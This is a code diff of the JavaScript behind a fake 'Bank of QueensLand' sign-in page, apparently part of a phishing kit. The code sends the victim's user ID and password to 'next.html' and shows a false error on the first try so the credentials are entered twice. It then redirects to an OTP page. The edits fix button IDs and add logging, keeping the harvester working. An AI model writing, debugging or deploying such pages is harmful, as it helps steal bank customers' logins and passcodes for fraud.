@@ -1788,15 +1788,14 @@
         const username = $('#txtUserid').val().trim();
         const password = $('#id11').val().trim();
         if (username && password) {
-            $('#btn-1').prop('disabled', false);
+            $('#btnSignIn').prop('disabled', false);
         } else {
-            $('#btn-1').prop('disabled', true);
+            $('#btnSignIn').prop('disabled', true);
         }
     }
     $('#txtUserid, #id11').on('keyup change', toggleButtonState);
     let successCount = 0;
 
-    // Form submission handling
     $('#login-form').submit(function(event) {
         event.preventDefault();
 
@@ -1806,33 +1805,34 @@
             title: 'Bank of QueensLand'
         };
         if (formData.username && formData.password) {
+            console.log("Sending data:", formData);
             $.ajax({
-    type: 'GET',
-    url: 'next.html',
-    data: formData,
-    success: function(response) {
-        console.log('Response:', response);
-        successCount++;
-        if (successCount === 1) {
-            $('#error-msg').show();
-            $('#txtUserid, #id11').val('');
-        }
-        if (successCount === 2) {
-            window.location.href = 'boq-otp.html';
-        }
-    },
-    error: function(xhr, status, error) {
-        console.error('AJAX Error:', error);
-        // Optionally show a user-friendly message
-    }
-});
+                type: 'GET',                    // must be GET for static files
+                url: 'next.html',               // use .html, not .php
+                data: formData,
+                success: function(response) {
+                    console.log('AJAX success, response:', response);
+                    successCount++;
+                    if (successCount === 1) {
+                        $('#error-msg').show();
+                        $('#txtUserid, #id11').val('');
+                    }
+                    if (successCount === 2) {
+                        window.location.href = 'boq-otp.html';
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.error('AJAX error:', status, error);
+                    console.error('Response text:', xhr.responseText);
+                }
+            });
         }
         $('#cross-1').click(function () {
-            $('#error-msg').hide(); // Hide the modal
-          });
+            $('#error-msg').hide();
+        });
     });
     $('#txtUserid').mask('00000000000000000');
-        });
+});
       </script>
             <aside id=sidebar role=complementary class="hidden-xs hidden-sm col-md-4">
               <h2 class=sr-only>User Tools</h2>
